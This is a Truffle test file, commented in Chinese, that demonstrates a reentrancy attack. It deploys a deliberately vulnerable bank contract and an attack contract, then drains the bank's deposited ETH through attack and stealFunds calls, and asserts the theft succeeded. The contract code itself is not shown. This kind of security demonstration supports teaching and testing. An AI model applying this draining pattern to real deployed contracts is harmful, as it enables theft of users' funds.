const VulnerableBank = artifacts.require("VulnerableBank");
const ReentrancyAttack = artifacts.require("ReentrancyAttack");

contract("SecurityTest", (accounts) => {
    let bank;
    const [owner, attacker] = accounts;
    
    beforeEach(async () => {
        bank = await VulnerableBank.new();
    });
    
    it("CVE-2023-001: 重入漏洞攻击演示", async () => {
        console.log("=== 开始重入攻击测试 ===");
        
        // 部署攻击合约
        const attackContract = await ReentrancyAttack.new(bank.address, {from: attacker});
        
        // 初始存款 - 银行有5ETH
        await bank.deposit({from: owner, value: web3.utils.toWei("5", "ether")});
        
        const initialBankBalance = await web3.eth.getBalance(bank.address);
        console.log("初始银行余额:", web3.utils.fromWei(initialBankBalance, "ether"), "ETH");
        
        // 执行攻击 - 攻击者只存入1ETH
        console.log("开始攻击...");
        await attackContract.attack({
            from: attacker,
            value: web3.utils.toWei("1", "ether")
        });
        
        // 攻击者窃取资金
        await attackContract.stealFunds({from: attacker});
        
        const finalBankBalance = await web3.eth.getBalance(bank.address);
        console.log("攻击后银行余额:", web3.utils.fromWei(finalBankBalance, "ether"), "ETH");
        
        // 验证攻击成功（银行余额远少于预期）
        assert.isBelow(
            Number(web3.utils.fromWei(finalBankBalance, "ether")), 
            4, 
            "银行余额应被大量盗取，证明重入漏洞存在"
        );
        
        console.log("✅ 重入攻击演示成功！");
    });
});